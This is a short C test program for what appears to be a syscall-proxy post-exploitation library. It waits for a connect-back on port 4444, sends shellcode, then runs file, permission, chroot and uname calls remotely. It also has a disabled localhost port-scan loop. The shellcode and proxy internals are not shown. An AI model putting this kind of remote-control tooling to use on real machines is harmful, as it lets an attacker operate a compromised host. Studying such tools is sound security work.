#include <stdio.h>
#include "libc_sp.h"

int main(void)
{
	int fd, sock;
	struct sockaddr_in addr;

	wait_connect_back(4444);
	send_sp_shellcode();

	/* chdir */
	sp_chdir("/");

	/* fchdir */
	fd = sp_open("/tmp", O_RDONLY | O_DIRECTORY);
	sp_fchdir(fd);
	sp_close(fd);

	/* chown && chmod */
	fd = sp_open("test", O_RDWR | O_EXCL | O_CREAT);
	sp_chmod("test", 0777);
	sp_fchmod(fd, 0660);
	sp_chown("test", 0, 0);
	//sp_fchow(fd, 0, 0);
	//sp_lchow("test", 0, 0);
	sp_close(fd);
	sp_unlink("/tmp/test");

	/* chroot */
	sp_chroot("/tmp");

	struct utsname utsn;
	sp_uname(&utsn);
	printf("uname: %s %s\n", utsn.version, utsn.release);

	int i, ret;
	for (i = 0; i < 0; i++) {
		/* connect */
		sock = sp_socket(PF_INET, SOCK_STREAM, 0);

		memset(&addr, 0, sizeof(addr));
		addr.sin_family = AF_INET;
		addr.sin_addr.s_addr = inet_addr("127.0.0.1");
		addr.sin_port = htons(i);

		ret = sp_connect(sock, (struct sockaddr *)&addr, sizeof(addr));
		if (!ret)
			printf("port %d is open\n", i);
	}

	int r;
	char buf[128];
	fd_set fds;

	FD_ZERO(&fds);
	FD_SET(0, &fds);
	sp_select(1, &fds, NULL, NULL, NULL);
	
	if (FD_ISSET(0, &fds)) {
		r = sp_read(0, buf, sizeof(buf));
		sp_write(1, buf, r);
	}
	

	return 0;
}


